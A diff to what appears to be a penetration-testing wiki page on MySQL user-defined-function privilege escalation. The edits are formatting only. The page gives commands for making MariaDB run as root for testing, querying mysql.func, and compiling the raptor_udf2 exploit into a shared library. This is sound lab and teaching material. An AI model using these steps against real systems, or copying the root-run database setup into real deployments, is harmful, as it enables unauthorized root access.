@@ -6,7 +6,11 @@ for testing purposes you can make your mysql service vulnerable manually
 
 To configure this vulnerability on Kali to test run the following commands.
 
-#### `chown -R root:root /var/lib/mysql` `nano /etc/mysql/mariadb.conf.d/50-server.cnf` `Change user=mysql to user=root and save the file` `service mysql restart`
+#### `chown -R root:root /var/lib/mysql`
+
+#### `nano /etc/mysql/mariadb.conf.d/50-server.cnf`&#x20;
+
+#### `Change user=mysql to user=root and save the file` `service mysql restart`
 
 ## <mark style="color:red;">Find mysql service user</mark>
 
@@ -22,8 +26,8 @@ first we have to see if mysql is running as root:
 its running as root.login:
 
 `mysql -u root`\
-`use mysql; >>> mysql is the database`\
-`select * from mysql.func; >>> search for udf`
+`use mysql; # mysql is the database`\
+`select * from mysql.func; # search for udf`
 
 ![](../../../.gitbook/assets/udf2.png)
 
@@ -57,8 +61,8 @@ the instructions are in exploit itslef
 
 compile on target machine
 
-`gcc -g -c raptor_udf2.c >>> for 32 bit systems`\
-`gcc -g -c raptor_udf2.c -fPIC >>> for 64 bit`\
+`gcc -g -c raptor_udf2.c # for 32 bit systems`\
+`gcc -g -c raptor_udf2.c -fPIC # for 64 bit`\
 `gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`
 
 This will prompt for the password.
